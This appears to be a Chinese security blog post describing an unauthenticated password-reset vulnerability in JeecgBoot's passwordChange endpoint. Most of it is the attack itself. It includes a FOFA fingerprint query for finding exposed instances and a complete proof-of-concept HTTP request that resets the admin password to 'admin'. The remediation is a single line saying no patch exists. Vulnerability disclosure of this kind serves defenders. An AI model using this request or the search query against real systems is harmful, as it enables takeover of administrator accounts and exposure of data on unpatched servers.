#  【漏洞文章】JeecgBoot 任意用户密码重置   
1ang  小羊安全屋   2024-12-16 06:23  
  
导言  
  
  
文章仅用作网络安全人员对自己网站、服务器等进行自查检测，不可用于其他用途，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。切勿用于网络攻击！！！  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/reg3T0Fqiax8lPLzcDQicIfv49r4EgibnRuz10rNYiaBDlUaSfqrWgYrD36DPE4uiar4kHLq7x60wPaguey7Pz8BTOA/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
PART   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/ktKCAuwAa8dmj6TprnPZe7wiasyw7EtyLyNy649qJ3lfwTtxWSKPhdzSJ7JicAxfkYSlAawXNCOmzhS3Rib2ZradA/640?wx_fmt=gif "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/bBPjSTVLnXbhGFgqz3CwuWdGELjD7wYzxM9mrvz9tUBAwaeMof26ca9fSicRezRV3vKt7a04AfuPcLoVBtgpYDw/640?wx_fmt=gif "")  
  
漏洞描述  
  
JeecgBoot框架passwordChange接口存在任意用户密码重置漏洞，未经身份验证的远程攻击者可以利用此漏洞重置管理员账户密码，从而接管系统后台，造成信息泄露，导致系统处于极不安全的状态。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/3RSJOISXa6jxhSggXrE9ibwcuRuSia2kIsFAHRbtYf5eb0O4TtXqn4yweC65OpzNRdrrnrkEYbjdqUkg9eIQVkHA/640?wx_fmt=gif "")  
  
漏洞复现  
  
漏洞URL：/novat-boot/sys/user/passwordChange  
  
漏洞参数：username、password  
  
F O F A ：body="/sys/common/pdf/pdfPreviewIframe"  
  
漏洞详情：  
  
1、打开自己的服务  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lnzwRq0p4icGicBYiciaztnTtHUFjpQ4mXhfDl8KMF0ABUWRKDToUdK4YJ4GnwQxh5jBDk1b8mSnHozMM4vnI5AJXQ/640?wx_fmt=png&from=appmsg "")  
  
2、使用以  
下POC进行验证  
```
GET /novat-boot/sys/user/passwordChange?username=admin&password=admin&smscode=&phone= HTTP/1.1
Host: 127.0.0.1:8088
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```  
  
3、漏洞利用成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lnzwRq0p4icGicBYiciaztnTtHUFjpQ4mXhfPiasY0PVhCiacI9kZJdHlHmPLE1R3RytHoM1ltxO2nGXXz1icDOLbicKTg/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/bBPjSTVLnXbhGFgqz3CwuWdGELjD7wYzxM9mrvz9tUBAwaeMof26ca9fSicRezRV3vKt7a04AfuPcLoVBtgpYDw/640?wx_fmt=gif "")  
  
修复建议  
  
官网  
目前未发布补丁  
，建议  
禁止对互联网开放  
，或  
采用白名单方式限制访问  
。  
   
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3YqocLTzbGQjus64G8bmAyDCiaaE8IY57OmvR7bHq1UzAqRG0gme38uvdXggrrlmNJyePh4Ox1AI9oQ1PY8otRw/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zQTAicxBBI1QaAzOgiblQicVnO8XZUWj6cpdOL8EHU0unLP9fGEBxdTZDXfHeeEGGibNzMYfxDgtyicKv8r5Q18UsyQ/640?wx_fmt=png "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibpQMTribKicf2Xibe2qFYgtMw8UhDdllzZryYjianfS4LcHCAT7VWbjwoaZNF4lCAxUmFdIibmUrBibToxxt9QbGf3WQ/640?wx_fmt=png "")  
  
个人星球，欢迎加入  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lnzwRq0p4icF88zkXzrnATODaPrYYSZ1ZUyicl3UZSdda9RxiavwPXEWfdn5WiboAA7HiavEZblfA9CLsFQKlxsU8Xg/640?wx_fmt=jpeg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/2TVkuiaNYQGjWwnsmctvTmClxYzHJicxBiahOibtjQicH8vaCz7TPFMK0EsiczbQfwzlSNiaaU8akYibuIdpUCicYoFGZNQ/640?wx_fmt=png "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1C21KZjMBaSHgMAvP4faiar3XTekytaNKOlc7UibOhTqxaA0iapiabBKVITYicR4NM125QTp9lYt9lylfI7LzfqkLsg/640?wx_fmt=png "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uNpMBR1pZOia18Kuib6Qukssk36955zGygr0vKFbclQLHMRSJqic5s7waKZlJrto2oTb42sYY7icxo5zcn24MjDSfA/640?wx_fmt=png "")  
  
  
  
  
**——The  End——**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaZREh6DtDyA9wcDsp0m1RNV9C4uiaagltPDn83s3k6Sw5DbfRWdGc25Q1WDNCpjZLXQpCxFfiaGT5ag/640?wx_fmt=gif "")  
  
  
  
